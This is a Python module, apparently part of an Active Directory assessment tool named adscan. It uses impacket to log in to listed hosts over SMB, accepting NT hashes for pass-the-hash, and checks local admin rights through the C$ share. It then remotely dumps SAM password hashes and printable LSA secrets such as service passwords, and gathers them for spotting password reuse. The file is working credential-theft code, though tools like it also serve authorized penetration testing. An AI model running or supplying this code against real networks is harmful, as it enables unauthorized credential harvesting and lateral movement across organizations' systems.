"""Active credential & local admin collection (impacket-based).

Layer 2 of adscan. The read-only LDAP layer maps the *domain*; this layer maps
the *local* attack surface:

- which credentials are local admin on which hosts (``AdminTo`` edges)
- SAM / LSA secrets on hosts where we hold admin (credential nodes)
- password-reuse hints between local and domain accounts

Opt-in via ``--active`` / ``--hosts``. Requires ``impacket``. This layer performs
authenticated SMB access and registry reads on the target hosts (the same
technique as ``secretsdump``); it never adds persistence or leaves artifacts
beyond what RemoteOperations cleans up.
"""

from __future__ import annotations

import logging
from dataclasses import dataclass, field
from typing import Any, Optional

log = logging.getLogger("adscan.active")

try:
    from impacket.dcerpc.v5.rpcrt import DCERPCException
    from impacket.examples.secretsdump import LSASecrets, RemoteOperations, SAMHashes
    from impacket.smbconnection import SMBConnection, SessionError

    HAS_IMPACKET = True
except Exception:  # pragma: no cover - impacket is optional
    HAS_IMPACKET = False


@dataclass
class Credential:
    account: str
    kind: str  # "nthash" | "password"
    value: str
    source_host: str
    rid: Optional[str] = None


@dataclass
class ActiveResult:
    admin_hosts: list[str] = field(default_factory=list)
    credentials: list[Credential] = field(default_factory=list)
    reuse_hints: list[dict[str, Any]] = field(default_factory=list)


def _parse_sam_line(line: str) -> Optional[Credential]:
    """Parse a SAM dump line 'name:rid:lmhash:nthash:::'."""
    parts = line.split(":")
    if len(parts) >= 4 and len(parts[-1]) == 0 and len(parts[-2]) == 0:
        name, rid, lmh, nth = parts[0], parts[1], parts[2], parts[3]
        if nth and nth not in ("31d6cfe0d16ae931b73c59d7e0c089c0",):  # skip empty hash
            return Credential(account=name, kind="nthash", value=nth, source_host="", rid=rid)
    return None


def _parse_lsa_secret(secret: str) -> Optional[Credential]:
    """Parse a printable LSA secret 'account:password'."""
    if ":" not in secret:
        return None
    name, value = secret.split(":", 1)
    value = value.strip()
    if not value:
        return None
    # skip DPAPI key material and other non-credential LSA secrets
    if name.lower().startswith(("dpapi", "nl$", "$machine")):
        return None
    # skip hex key material and machine-account kerberos/hash material
    if value.startswith(("0x", "aes256-", "aes128-", "des-cbc", "plain_password_hex", "aad3b435")):
        return None
    return Credential(account=name.strip(), kind="password", value=value, source_host="")


def _split_hashes(hashes: Optional[str]) -> tuple[str, str]:
    """Split 'LMHASH:NTHASH' (or bare NTHASH) into (lmhash, nthash)."""
    if not hashes:
        return "", ""
    parts = hashes.split(":")
    if len(parts) >= 2:
        return parts[0], parts[1]
    return "", parts[0]


class ActiveCollector:
    """Check local-admin access and dump SAM/LSA on target hosts."""

    def __init__(self, username: str = "", password: str = "", domain: str = "",
                 hashes: Optional[str] = None):
        self.username = username
        self.password = password
        self.domain = domain
        self.hashes = hashes
        self._requires_impacket()

    @staticmethod
    def _requires_impacket() -> None:
        if not HAS_IMPACKET:
            raise RuntimeError("--active requires impacket: pip install impacket")

    def _connect(self, host: str) -> SMBConnection:
        conn = SMBConnection(host, host)
        lmhash, nthash = _split_hashes(self.hashes)
        conn.login(self.username, self.password, self.domain, lmhash=lmhash, nthash=nthash)
        return conn

    def check_admin(self, host: str) -> bool:
        """True if the credentials are local admin on ``host`` (via C$ admin share)."""
        conn = self._connect(host)
        try:
            try:
                conn.connectTree("C$")
                return True
            except (SessionError, DCERPCException):
                return False
        finally:
            try:
                conn.logoff()
            except Exception:
                pass
            try:
                conn.close()
            except Exception:
                pass

    def dump_secrets(self, host: str) -> list[Credential]:
        """Dump SAM hashes + printable LSA secrets from ``host`` (admin required)."""
        conn = self._connect(host)
        sam_lines: list[str] = []
        lsa_creds: list[Credential] = []

        def sam_cb(secret: str) -> None:
            sam_lines.append(str(secret))

        def lsa_cb(secret_type: Any, secret: str) -> None:
            # only printable LSA secrets (service/account passwords)
            printable = getattr(LSASecrets.SECRET_TYPE, "LSA", None)
            if printable is not None and secret_type == printable:
                cred = _parse_lsa_secret(str(secret))
                if cred:
                    lsa_creds.append(cred)

        remote_ops = RemoteOperations(conn, False)
        remote_ops.enableRegistry()
        boot_key = remote_ops.getBootKey()
        try:
            sam = SAMHashes(remote_ops.saveSAM(), boot_key, isRemote=True,
                            perSecretCallback=sam_cb)
            try:
                sam.dump()
            finally:
                sam.finish()

            lsa = LSASecrets(remote_ops.saveSECURITY(), boot_key, remoteOps=remote_ops,
                             isRemote=True, perSecretCallback=lsa_cb)
            try:
                lsa.dumpSecrets()
            finally:
                lsa.finish()
        finally:
            remote_ops.finish()
            try:
                conn.logoff()
            except Exception:
                pass
            try:
                conn.close()
            except Exception:
                pass

        creds: list[Credential] = []
        for line in sam_lines:
            c = _parse_sam_line(line)
            if c:
                c.source_host = host
                creds.append(c)
        for c in lsa_creds:
            c.source_host = host
            creds.append(c)
        return creds

    def run(self, hosts: list[str]) -> ActiveResult:
        """Check admin + dump secrets across hosts; compute reuse hints."""
        result = ActiveResult()
        for host in hosts:
            host = host.strip()
            if not host:
                continue
            try:
                if self.check_admin(host):
                    result.admin_hosts.append(host)
                    log.info("local admin on %s", host)
                    creds = self.dump_secrets(host)
                    result.credentials.extend(creds)
                    log.info("dumped %d credentials from %s", len(creds), host)
                else:
                    log.info("not admin on %s", host)
            except Exception as exc:  # noqa: BLE001
                log.warning("active collection failed on %s: %s", host, exc)
        return result
